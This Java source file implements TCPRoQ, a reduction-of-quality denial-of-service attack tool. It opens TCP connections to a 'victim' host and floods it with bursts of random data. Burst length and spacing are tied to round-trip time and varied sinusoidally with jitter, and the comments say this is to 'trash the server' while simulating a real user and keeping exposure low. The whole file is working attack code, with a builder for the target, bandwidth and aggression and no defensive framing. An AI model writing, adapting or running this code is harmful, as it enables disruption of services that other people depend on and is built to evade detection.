package hardroq.networking;

import java.io.OutputStream;
import java.net.Socket;
import java.util.Date;
import java.util.Random;
import java.util.logging.Logger;

public class TCPRoQ {
	//Tools
	private final Random random = new Random();
	private Thread workerThread;
	private Socket socket;
	
	//Parameters
	private final String host;
	private final int port;
	private final String header;
	private final String footer;
	private final byte[] payload;
	private final float bandwidth;
	private int datasize;			// header + random data + footer
	private int period;				// T
	private int amplitude;			// δ
	private int duration;			// t
	private int timeout;			// T - t
	private float aggression;		// M
	

	//Internals
	volatile private static int RTT;
	private boolean attacking = false;
	
	private TCPRoQ (Builder builder) {
		host = builder.host;
		port = builder.port;
		RTT = builder.RTT;
		datasize = builder.datasize;
		header = builder.header;
		footer = builder.footer;
		aggression = builder.aggression;
		bandwidth = builder.bandwidth;  //this should be in kb/ms, which just happens to be the same as mb/s :)
		
		//for now, let's just const the payload
		payload = (header + footer + "\r\n\r\n").getBytes();
		workerThread = new Thread();
	}
	
	public void InitiateAttack() {
		attacking = true;
		if (!workerThread.isAlive()) {
			workerThread = new Thread(work, "Attack Thread");
			workerThread.start();
		}
	}
	
	public void EndAttack() {
		attacking = false;
	}
	
	private Runnable work = new Runnable() {
		@Override
		public void run() {
			while (attacking) {
				try {
					//Establish a connection to our victim
					socket = new Socket(host, port);
					socket.setSoTimeout(2000);
				
					/*
					  Connection established, now the idea is to repeatedly send requests at an amplitude (rate)
					  such that: amplitude = ((aggression * bandwidth) * duration) / datasize per second.
					  
					  duration will vary from between RTT ~ 2RTT in attempt to trash the server, while keeping exposure low
					  
					  period will vary sinusoidally between 8 ~ 20 RTT with a jitter of ±2 in order to simulate a real user 
					*/
					int c = random.nextInt(12);					
					OutputStream out = socket.getOutputStream();
					long l = 0;
					while (socket.isConnected() && attacking) {
						//calculate the period for this attack round (in ms).
						period = (RTT * ((8 + (int) Math.ceil(Math.sin(c / 12f) * 12)) + (2 - random.nextInt(4))));
						
						if (++c > 12) c = 0;
						
						//calculate the duration for this attack round (in ms).
						duration = (int) Math.ceil(RTT * (1 + random.nextFloat()));
						
						//calulate the amplitude for this attack
						amplitude = (int) Math.ceil(((aggression * bandwidth) * duration) / (payload.length * .008f));
						
						//calculate the timeout
						timeout = period - duration;
						
						for (int i = amplitude; --i > 0;) {
							//generate our crap data
							random.nextBytes(payload);
							
							//send the data
							out.write(payload);
							out.flush();
							//and just to be sure..
							out.flush();
							
							//clear the input buffer
							socket.getInputStream().skip(socket.getInputStream().available());
							System.out.println(String.valueOf(++l) + ": Packet sent");
						}
						
						//sleep for the timeout
						Thread.sleep(timeout);
					}
				} catch (Exception ex) {
					System.out.println(ex.getMessage());
				}
			}
		}
	};
	
	public static void setRTT(final int r) {
		RTT = r;
	}
	
	public static class Builder {
		public Builder() {}
		private String host = "127.0.0.1";
		private int port = 80;
		private int RTT = 150;
		private int datasize = 16 * 1024;
		private String header = "";
		private String footer = "";
		private float aggression = 1.0f;
		private float bandwidth = 1;  //1MB line
		
		public TCPRoQ build() {
			return new TCPRoQ(this);
		}
		
		public Builder host(final String h) {
			host = h;
			return this;
		}
		
		public Builder port (final int p) {
			port = p;
			return this;
		}
		
		public Builder RTT (final int t) {
			RTT = t;
			return this;
		}
		
		public Builder datasize (final int d) {
			datasize = d;
			return this;
		}

		public Builder header(final String h) {
			header = h;
			return this;
		}
		
		public Builder footer(final String f) {
			footer = f;
			return this;
		}
		
		public Builder aggression(final float a) {
			aggression = a;
			return this;
		}
		
		public Builder bandwidth(final float b) {
			bandwidth = b;
			return this;
		}
	}
}
